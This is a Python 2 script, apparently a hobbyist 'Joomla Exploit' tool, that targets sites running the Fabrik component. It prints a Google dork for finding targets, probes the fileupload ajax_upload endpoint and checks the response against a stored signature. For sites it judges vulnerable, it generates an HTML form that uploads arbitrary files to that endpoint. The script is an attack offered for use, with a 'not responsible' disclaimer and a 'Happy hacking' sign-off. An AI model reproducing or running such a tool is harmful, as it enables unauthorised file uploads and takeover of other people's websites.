#!/bin/env python2
# script owner="sachin"
# created on date 27/10/2018

import os
import sys
import time
import urllib2

def cls():
	if sys.platform == 'linux2':
		os.system("clear")
	else:
		os.system("cls")

logo1 = '''
\033[1;33mWARNING :\033[1;39m I am not responsible for your actions
\033[1;36m
'''
print logo1
print ''
x = raw_input("press enter to continue ...")
if sys.platform == 'linux2':
	os.system("clear")
else:
	os.system("cls")

logo2 = '''
\t   |  |-------    __     _____  
\t   |  |       |  /  \   |       |   \033[1;39m VERSION : \033[1;32m1.0\033[1;39m
\t\033[1;36m   |  |       | |    |  |_____  |   \033[1;32m JOOMLA EXPLOIT\033[1;36m
\t   |  |       | |    |        | |_____
\t   |  |       | |    |        | |     |
\t|__/  |-------   \__/ \ ______| |     |

'''
print logo2
print "\033[1;31mDork :\033[1;39m inurl:index.php/component/fabrik/ site:\033[1;39m"
print ""
def hlp():
 help= '''\033[1;39m
\t Commands      Description
\t\033[1;31m ========      ===========\033[1;39m
\t
\t -h/help       Help
\t set url       set url <targeted site>
\t clear         clear screen
\t run           Creates payload
\t exit          Exit the program
\t\033[1;39m
'''
 print help

main = ""
u = ""
while True:
	try:
	 cod = raw_input("\033[1;39mCoder \033[1;32m>>\033[1;32m ")
	 coder = cod.split()
	 if not coder:
                print "<\033[1;31minvalid command\033[1;39m>"
                continue
	 elif coder[0] == "help":
		hlp()
	 elif coder[0] == "-h":
		hlp()
	 elif coder[0] == "exit":
		print "\033[1;39m"
		break
	 elif coder[0] == "set":
		if coder[1] == "url":
		 u = str(coder[2])
	 elif coder[0] == "exit":
		break
	 elif coder[0] == "run":
		if u == "":
			print ''
			print "[x] Please provide url"
			print ''
			continue 
		payload = "/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload"
		ur = u + payload
		try:
		 try:
		  main = urllib2.urlopen(ur).read()
		 except connection:
		  	pass
		except NameError:
		      print ''
		      print "[x] Check your Internet connection"
		      print ''
		      continue
		pat = "check.txt"
		if os.path.exists(pat):
			os.remove(pat)

		check1 = open("check.txt", "w")
		check1.write(main)
		check1.close()

		check = open("check.txt" , "r")
		check2 = check.read()
		check.close()

		vuln = open("vul.txt", "r")
		vu = vuln.read()
		vuln.close()
		
		print ''
		print check2
		print ''

		if check2 != vu:
			print "Site is not vulnerable"
		else:
			print "Site is vulnerable"
			sachin = "payload/index.html"

			if os.path.exists(sachin):
				os.remove(sachin)

			expl = open("payload/index.html" , "w")
			expl.write("<html><head> \n")
			expl.write("<title>Joomla Exploit</title> \n")
			expl.write('</head><body background=""> \n')
			expl.write('<link rel="stylesheet" type="text/css" href="//fonts.googleapis.com/css?family=Amaranth"> \n')
			expl.write('<style> \n')
			expl.write('   body { \n')
			expl.write('   font-family:Amaranth; \n ')
			expl.write('   } \n')
			expl.write('</style> \n')
			expl.write('<center><br><br><br><br><br><br><br><br><br><br> \n')
			expl.write('<h1 style="color:green;">Joomla Exploit</h1> \n')
			expl.write('<form method="POST" action="'+ur+'" enctype="multipart/form-data"> \n')
			expl.write('<input type="file" name="file"><button>Exploit</button> \n')
			expl.write('</form> \n')
			expl.write('</<center></body></html> \n')
			expl.close()

			print ''

			bairamma = open("payload/index.html" , "r")
			boothappa = bairamma.read()
			bairamma.close()
			
			print ''
			print "\t\033[1;39m Payload "
			print "\t\033[1;31m ======="
			print ''
			print boothappa
			print ''
			print "\033[1;32mPayload generated in [ payload/index.html ] Happy hacking ...\033[1;39m"
			print ''

	 elif coder[0] == "show":
		if coder[1] == "options":
			print '\033[1;39m'
			print "\t Input Options"
			print '\t\033[1;31m =============\033[1;39m'
			print ""
			print '\t url :\033[1;32m ',u
			print '\033[1;39m'
	 elif coder[0] == "clear":
		cls()
	 else:
		print "<\033[1;31minvalid command\033[1;39m>"
		continue
	except IndexError:
	 print "<\033[1;31minvalid command\033[1;39m>"
	 pass
